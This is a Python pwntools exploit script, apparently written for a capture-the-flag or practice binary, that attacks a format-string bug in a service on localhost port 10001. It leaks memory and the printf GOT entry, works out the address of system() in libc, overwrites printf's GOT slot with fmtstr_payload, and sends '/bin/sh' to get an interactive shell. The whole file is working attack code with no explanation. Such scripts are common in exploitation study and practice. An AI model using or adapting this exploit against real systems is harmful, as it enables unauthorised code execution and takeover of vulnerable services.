#!/usr/bin/env python

from pwn import *

# context.log_level = 'debug'

def exec_fmt(payload):
    p.sendline(payload)
    info = p.recv()
    return info
# p = remote('127.0.0.1', '10001')
# p.recvline()
# auto = FmtStr(exec_fmt)
# offset = auto.offset
# p.close()

def dump_memory(start_addr, end_addr):
    result = ""
    while start_addr < end_addr:
        p = remote('127.0.0.1', '10001')
        p.recvline()
        # print result.encode('hex')
        payload = "%9$s.AAA" + p32(start_addr)
        p.sendline(payload)
        data = p.recvuntil(".AAA")[:-4]
        if data == "":
            data = "\x00"
        log.info("leaking: 0x%x --> %s" % (start_addr, data.encode('hex')))
        result += data
        start_addr += len(data)
        p.close()
    return result
# start_addr = 0x8048000
# end_addr   = 0x8049000
# code_bin = dump_memory(start_addr, end_addr)
# with open("code.bin", "wb") as f:
#     f.write(code_bin)
#     f.close()
printf_got = 0x8049974

## method 1
def get_printf_addr():
    p = remote('127.0.0.1', '10001')
    p.recvline()
    payload = "%9$s.AAA" + p32(printf_got)
    p.sendline(payload)
    data = p.recvuntil(".AAA")[:4]
    log.info("printf address: %s" % data.encode('hex'))
    return data
# printf_addr = get_printf_addr()
printf_addr = 0xf7e0e670
offset_printf = 0x00051670
offset_system = 0x0003cc50
system_addr = printf_addr - (offset_printf - offset_system)

## method 2
def leak(addr):
    p = remote('127.0.0.1', '10001')
    p.recvline()
    payload = "%9$s.AAA" + p32(addr)
    p.sendline(payload)
    data = p.recvuntil(".AAA")[:-4] + "\x00"
    log.info("leaking: 0x%x --> %s" % (addr, data.encode('hex')))
    p.close()
    return data
# data = DynELF(leak, 0x08048490)     # Entry point address
# system_addr = data.lookup('system', 'libc')
# printf_addr = data.lookup('printf', 'libc')
# log.info("system address: 0x%x" % system_addr)
# log.info("printf address: 0x%x" % printf_addr)

## get shell
payload = fmtstr_payload(7, {printf_got: system_addr})
p = remote('127.0.1.1', '10001')
p.recvline()
p.sendline(payload)
p.recv()
p.sendline('/bin/sh')
p.interactive()